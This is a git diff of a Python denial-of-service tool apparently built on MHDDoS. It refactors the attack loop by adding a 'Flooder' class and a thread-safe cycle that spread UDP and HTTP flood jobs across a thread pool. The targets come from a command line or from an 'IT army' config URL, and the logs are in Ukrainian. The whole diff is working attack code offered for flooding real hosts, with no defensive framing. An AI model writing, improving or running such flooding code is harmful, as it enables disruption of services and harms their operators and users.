@@ -5,7 +5,9 @@ import queue
 from collections import namedtuple
 from concurrent.futures import Future, Executor
 from concurrent.futures.thread import _WorkItem
-from threading import Thread, Event
+from contextlib import suppress
+from itertools import cycle
+from threading import Event, Lock, Thread
 from time import sleep, time
 
 from src.cli import init_argparse
@@ -63,6 +65,32 @@ class DaemonThreadPool(Executor):
                 work_item.run()
                 del work_item
 
+def thread_safe_cycle(kwargs_list):
+    it = cycle(kwargs_list)
+    lock = Lock()
+    while True:
+        try:
+            with lock:
+                value = next(it)
+        except StopIteration:
+            return
+        yield value
+
+
+class Flooder:
+
+    def __init__(self, event, args_iter):
+        self._event = event
+        self._args_iter = args_iter
+
+    def __call__(self, *args, **kwargs):
+        self._event.wait()
+        while self._event.is_set():
+            kwargs = next(self._args_iter)
+            runnable = mhddos_main(**kwargs)
+            with suppress(Exception):
+                runnable.run()
+
 
 def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
     threads_per_target = total_threads // len(targets)
@@ -70,6 +98,7 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     for target in targets:
         assert target.is_resolved, "Unresolved target cannot be used for attack"
         # udp://, method defaults to "UDP"
+        # XXX: UDP has to go on a separate thread pool
         if target.is_udp:
             params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
         # Method is given explicitly
@@ -89,7 +118,9 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
     statistics = {}
     event = Event()
-    event.set()
+
+    # XXX: refactor this code, no need to have 2 cycles
+    kwargs_list = []
     for params in params_list:
         thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
         statistics[params] = thread_statistics
@@ -97,18 +128,28 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
             'url': params.target.url,
             'ip': params.target.addr,
             'method': params.method,
-            'threads': params.threads,
+            'threads': 0,
+            # XXX: no need to carry this parameter 
+            #'threads': params.threads,
             'rpc': int(params.target.option("rpc", "0")) or rpc,
-            'thread_pool': thread_pool,
+            # XXX: no need to carry this parameter 
+            # 'thread_pool': thread_pool ,
+            'thread_pool': None,
             'event': event,
             'statistics': thread_statistics,
             'proxies': proxies,
         }
-        mhddos_main(**kwargs)
+        kwargs_list.append(kwargs)
+
         if not table:
             logger.info(
                 f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
                 % (params.target.url.host, params.method, params.threads))
+
+    kwargs_iter = thread_safe_cycle(kwargs_list)
+    for _ in range(total_threads):
+        thread_pool.submit(Flooder(event, kwargs_iter))
+    event.set()
 
     if not (table or debug):
         print_progress(period, 0, len(proxies))
@@ -141,7 +182,8 @@ def start(args):
             )
 
     thread_pool = DaemonThreadPool()
-    total_threads = thread_pool.start(args.threads)  # It is possible that not all threads were started
+    # It is possible that not all threads were started
+    total_threads = thread_pool.start(args.threads)
     if args.itarmy:
         targets_iter = Targets([], IT_ARMY_CONFIG_URL)
     else:
